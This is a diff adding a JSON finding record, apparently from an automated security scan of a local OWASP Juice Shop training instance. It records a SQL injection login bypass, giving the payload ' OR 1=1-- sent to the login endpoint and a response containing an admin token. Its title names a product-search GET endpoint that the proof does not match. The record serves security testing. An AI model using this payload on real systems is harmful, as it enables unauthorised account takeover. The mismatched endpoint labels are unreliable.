@@ -1,0 +1,28 @@
+{
+  "id": "ev_1784855310361_8df0b5",
+  "type": "tool_output",
+  "source_tool": "finding",
+  "summary": "SQL Injection in Product Search @ GET http://127.0.0.1:3010/rest/products/search?q=",
+  "data": {
+    "kind": "proof",
+    "observation": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "path_or_url": "GET http://127.0.0.1:3010/rest/products/search?q=",
+    "location": "GET http://127.0.0.1:3010/rest/products/search?q=",
+    "title": "SQL Injection in Product Search",
+    "stdout": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "body_preview": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "capture_via": "http",
+    "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+    "method": "POST",
+    "url": "http://127.0.0.1:3010/rest/user/login",
+    "status": 200,
+    "request_body": "{\"email\":\"' OR 1=1--\",\"password\":\"test\"}",
+    "request_headers": {
+      "Content-Type": "application/json"
+    },
+    "source_tool_act": "http",
+    "act_summary": "POST http://127.0.0.1:3010/rest/user/login → 200"
+  },
+  "created_at": "2026-07-24T01:08:30.361Z"
+}
